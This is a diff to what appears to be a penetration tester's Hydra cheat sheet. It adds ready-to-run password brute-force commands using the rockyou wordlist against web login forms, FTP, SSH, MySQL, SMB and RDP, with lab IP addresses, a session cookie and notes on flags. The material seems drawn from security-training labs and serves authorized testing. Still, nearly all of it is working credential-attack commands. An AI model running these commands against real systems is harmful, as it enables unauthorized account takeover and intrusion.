@@ -24,6 +24,33 @@ Options:
   service   the service to crack (see below for supported protocols)
   OPT       some service modules support additional input (-U for module help)
   -V for verbosity
+
+HTTP-Post-Form
+Bruteforce web HTTP form
+hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>"
+sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
+
+After filling in the placeholders, here’s our command:
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.x http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
+
+HTTP-form-post
+Putting these pieces together, we can complete the http-form-post syntax as given in Listing 21.
+Specifying the http-form-post syntax
+http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN"
+    
+The complete command can now be executed. 
+We will supply the admin user name (-l admin) and wordlist (-P), request verbose output with -vV, and use -f to stop the attack when the first successful result is found. 
+In addition, we will supply the service module name (http-form-post) and its required arguments ("/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN") 
+kali@kali:~$ hydra 10.11.0.x http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
+
+Hydra Post on a forum
+hydra -l mute -P /usr/share/wordlists/rockyou.txt internal.site.tld http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=login:Invalid Username or Password"
+
+Post with Cookies
+hydra -l garry -F -P /usr/share/wordlists/rockyou.txt 10.11.x.x -s 8080 http-post-form "/php/index.php:tg=login&referer=index.php&login=login&sAuthType=Ovidentia&nickname=^USER^&password=^PASS^&submit=Login:F=Failed:H=Cookie\: OV3176019645=a4u215fgf3tj8718i0b1rj7ia5"
+
+-F stop after getting login
+http-post-form “<url>:<post data>:F=<fail text:H=<header>”
   
 HTTP-Post  
 sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
@@ -44,9 +71,7 @@ A valid hydra command would look like this:
 
 hydra -I -f -L usernames.txt -P passwords.txt 'http-post-form://192.168.207.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
 hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.207.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
-
-Hydra Post on a forum
-hydra -l mute -P /usr/share/wordlists/rockyou.txt internal.site.local http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=login:Invalid Username or Password"
+kali@kali:~$ sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
 
 FTP
 hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt x.x.x.x ftp
@@ -64,18 +89,39 @@ The -e switch has three options, n, s, and r:
 For FTP attack use this command
     #hydra -l userlogin -P password-list-adress ftp://----IP--Address -V
     
-FTP 
-$ hydra -l admin -C /usr/share/seclists/Passwords/Default-Credentials 192.168.106.110 ftp ← Good default cred list. 
+FTP: 
+$ hydra -l admin -C /usr/share/seclists/Passwords/Default-Credentials 192.168.x.x ftp ← Good default cred list. 
 
+SSH:
+$ hydra -L users -P pass ssh://192.168.x.x -t 4 -s 43022
 
 SSH
-$ hydra -L users -P pass ssh://192.168.136.125 -t 4 -s 43022
+Bruteforce SSH credentials
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
 
-RDP
-hydra -t 1 -V -f -l administrator -P rockyou.txt rdp://192.168.1.1
+-f: Exit as soon as at least one a login and a password combination is found
+-t: Tasks, run tasks number of connects in parallel per target, default is 16 Tasks. 
 
+For ssh attack:
+Hydra -l userlogin -P password-list-adress ssh:// — — IP — Address -V
 
+MySQL:
+Bruteforce MySQL credentials
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP mysql
 
+SMB:
+Bruteforce SMB credentials
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP smb
 
+RDP:
+hydra -t 1 -V -f -l administrator -P rockyou.txt rdp://192.168.x.x
 
+RDP:
+Windows RDP
+Bruteforce Windows Remote Desktop credentials
+hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP
+
+RDP:
+Hydra RDP
+sudo hydra -f -l nadine -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://192.168.x.x -v -t 4  
 
